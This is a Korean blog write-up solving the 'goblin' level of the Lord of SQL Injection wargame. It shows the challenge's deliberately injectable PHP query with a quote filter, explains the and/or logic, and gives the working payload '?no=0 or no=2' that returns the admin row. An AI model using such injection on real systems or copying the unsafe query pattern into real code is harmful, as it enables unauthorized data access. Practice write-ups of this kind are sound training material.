---
title: "[Lord of SQL Injection] LoS - goblin 문제풀이"
date: 2018-07-22
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다음 문제는 `goblin` 문제이다.
이번에는 `password column` 대신에 `no column`이 생겼다.  

<!--more-->

코드는 다음과 같다.  

```php
--------------------------------------------------------------------------------
query : select id from prob_goblin where id='guest' and no=
--------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

`no column`이 새로 생겼으며, `id`가 `guest`로 고정되어 있다.
또한 이번에는 `'(싱글쿼터)`를 입력할 수 없다.

하지만 문제를 풀기 위해서는 `id`가 `admin`인 행을 추출해야 한다.
`where` 절에서 `id='guest'`와 `no=??`의 두 조건은 `and`로 연결되어 있다.

따라서 이를 이용 해 문제를 풀 수 있을 것 같다.
데이터베이스에 아래와 같이 저장되어 있다고 가정 해 보자.  

| no  | id |
| :------------ | :-----------: |
| 0 | guest |
| 1 | admin |

이 경우, 만약 `no` 자리에 `0`이 있다면 결과적으로 `where id='guest' and no={$_GET[no]}`의 where 절은 참이 되므로 첫 번째 행이 추출 될 것이다.
하지만 만약 `no`자리에 `0이 아닌 값`이 들어간다면 결과적으로 조건절은 `거짓`이 되어 아무런 결과 값을 가져오지 않는다.
이 때, 만약 뒤에 아래와 같이 `or`로 묶인 조건이 추가적으로 있을 경우 뒤의 조건문을 실행하게 된다.  

```mysql
where id='guest' and no=1 or no=1
```

위의 where 절에서 `id='guest'`이고 `no=1`인 행이 없으므로, `and`로 묶여 있는 조건은 `거짓`이 된다.
때문에 `or`뒤의 조건을 실행하게 되어 `no=1`인 행을 추출하게 된다.

따라서 기존에 있던 조건 뒤에 추가적으로 조건을 삽입할 수 있다면 `id`가 `guest가 아닌` 행을 추출할 수 있다.
먼저 문제를 풀기 위해 `guest`의 `no`가 무엇인지 확인하기 위해 `no`에 `0`, `1`을 입력 해 보았다.  

```php
---------------------------------------------------------------------------------
query : select id from prob_goblin where id='guest' and no=1
---------------------------------------------------------------------------------

Hello guest
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

그 결과 `no`가 `1`일 때 `Hello guest`가 출력되는 것을 확인할 수 있다.
따라서 `guest`의 `no`는 `1`임을 알 수 있으며 추측할 수 있는 데이터베이스의 데이터는 다음과 같다.  

| no  | id |
| :------------ | :-----------: |
| 1 | guest |
| 1이 아닌 값 | admin |

즉, `id`가 `admin`인 행의 `no`는 `1이 아닌 값`으로 되어 있을 것이다.
위에서 설명했다시피 다음과 같이 입력 해 `and`로 묶인 조건을 거짓으로 만드는 쿼리를 구성하면 `id가 guest가 아닌 행`을 추출할 수 있다.  

```plain
?no=0 or no=0
```

따라서 `id`가 `admin`인 행을 추출하기 위해 `or` 뒤의 `no` 자리에 `1`이 아닌 값을 차례로 입력 해 보면 언젠가는 내가 원하는 행을 추출할 수 있을 것이다.
`0`부터 입력해 본 결과, `no`가 `2`일 때 문제를 풀 수 있었다.  

```php
---------------------------------------------------------------------------------------------
query : select id from prob_goblin where id='guest' and no=0 or no=2
---------------------------------------------------------------------------------------------

Hello admin
GOBLIN Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

---

```plain
GOBLIN Clear!!
```